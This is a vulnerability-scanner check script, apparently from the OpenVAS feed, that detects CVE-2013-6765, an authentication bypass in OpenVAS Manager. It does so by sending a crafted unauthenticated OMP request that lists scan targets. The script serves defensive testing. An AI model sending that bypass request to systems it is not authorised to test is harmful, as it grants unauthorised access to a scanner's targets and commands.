CPE = "cpe:/a:openvas:openvas_manager";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103827" );
	script_version( "$Revision: 13876 $" );
	script_cve_id( "CVE-2013-6765" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "$Date: 2019-02-26 13:04:06 +0100 (Tue, 26 Feb 2019) $" );
	script_tag( name: "creation_date", value: "2013-11-08 13:02:55 +0200 (Fri, 08 Nov 2013)" );
	script_name( "OpenVAS Manager Authentication Bypass" );
	script_category( ACT_GATHER_INFO );
	script_family( "General" );
	script_copyright( "This script is Copyright (C) 2013 Greenbone Networks GmbH" );
	script_dependencies( "gb_openvas_manager_detect.sc" );
	script_require_ports( "Services/omp_gmp", 9390 );
	script_mandatory_keys( "openvasmd_gvmd/detected" );
	script_exclude_keys( "greenbone/gos/detected" );
	script_xref( name: "URL", value: "http://openvas.org/OVSA20131108.html" );
	script_tag( name: "impact", value: "Attackers can exploit these issues to gain unauthorized access to the
  affected application and perform certain actions." );
	script_tag( name: "vuldetect", value: "Try to bypass OMP authentication by sending a special crafted request." );
	script_tag( name: "insight", value: "A software bug in the server module 'OpenVAS Manager' allowed to bypass the OMP
  authentication procedure. The attack vector is remotely available in case public OMP is enabled.
  In case of successful attack, the attacker gains partial rights to execute OMP commands. The bypass
  authentication is, however, incomplete and several OMP commands will fail to execute properly." );
	script_tag( name: "solution", value: "Update to version 3.0.7 or 4.0.4." );
	script_tag( name: "summary", value: "The remote OpenVAS Manager is prone to an authentication bypass." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("host_details.inc.sc");
if(get_kb_item( "greenbone/gos/detected" )){
	exit( 0 );
}
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!get_app_location( port: port, cpe: CPE )){
	exit( 0 );
}
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
req = "<get_version/><get_targets/>";
send( socket: soc, data: req + "\r\n" );
res = recv( socket: soc, length: 1024 );
close( soc );
if(ContainsString( res, "get_targets_response" ) && ContainsString( res, "target id" )){
	report = "By sending the request \"" + req + "\" to the remote OMP service it was possible to bypass the authentication. Response:\n\n" + res;
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

